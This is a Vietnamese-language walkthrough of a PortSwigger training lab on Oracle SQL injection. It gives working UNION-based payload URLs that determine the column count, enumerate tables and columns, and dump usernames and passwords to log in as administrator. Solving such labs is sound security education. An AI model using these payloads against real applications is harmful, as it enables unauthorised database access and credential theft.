# Lab: SQL injection attack, listing the database contents on Oracle

### Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
![Require of Lab](/Images/sql10.1.png)

Yêu cầu của bài lab là đăng nhập bằng thông tin của user `administrator`

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql10.2.png)

Bước đầu tiên để giải quyết bài lab, ta phải xác định số cột được trả về là bao nhiêu. 
Sau khi tăng dần vị trí tương đối lên đến 3 thì thấy thông báo lỗi, do đó ta xác định được số cột được trả về là 2
> https://ac981fa11f0346e6c0c1028e0087005b.web-security-academy.net/filter?category=Gifts`'+ORDER+BY+3--`

![Error of query](/Images/sql10.3.png)

Tiếp theo, là xác định từng cột trả về có chứa văn bản hay không.
Ta kiểm tra các cột được trả về bằng cách chèn một vài ký tự trong cột và xem phản hồi
> https://ac981fa11f0346e6c0c1028e0087005b.web-security-academy.net/filter?category=Gifts`'+UNION+SELECT+'abc','3gb'+FROM+dual--`

![Check column](/Images/sql10.4.png)


Sau khi xác định các cột đều chứa văn bản, ta tiến hành lấy thông tin của các bảng có trong dtb như sau
> https://ac981fa11f0346e6c0c1028e0087005b.web-security-academy.net/filter?category=Gifts`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

![All tables](/Images/sql10.5.png)
Sau khi có được toàn bộ bảng có trong dtb, ta thấy có một bảng tên là `USERS_NHJWZF` là bảng chứa các thông tin của user, bây giờ ta sẽ đi lấy thông tin của các cột có trong bảng `USERS_NHJWZF` này
> https://ac981fa11f0346e6c0c1028e0087005b.web-security-academy.net/filter?category=Gifts`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NHJWZF'--`

![All column](/Images/sql10.6.png)

Đã có được thông tin của các cột trong bảng chứa thông tin user, thì ta sẽ tiến hành lấy thông tin của các user thông qua các cột usename và password
> https://ac981fa11f0346e6c0c1028e0087005b.web-security-academy.net/filter?category=Gifts`'+UNION+SELECT+PASSWORD_XDISKB,USERNAME_RERJRT+FROM+USERS_NHJWZF--`

![All user](/Images/sql10.7.png)

Để hoàn thành bài lab, ta dùng thông tin của user `administrator` để đăng nhập vào website
![Result](/Images/sql10.8.png)


<div align="right"> <i> Ngày 22 tháng 01 năm 2022 </i> </div>
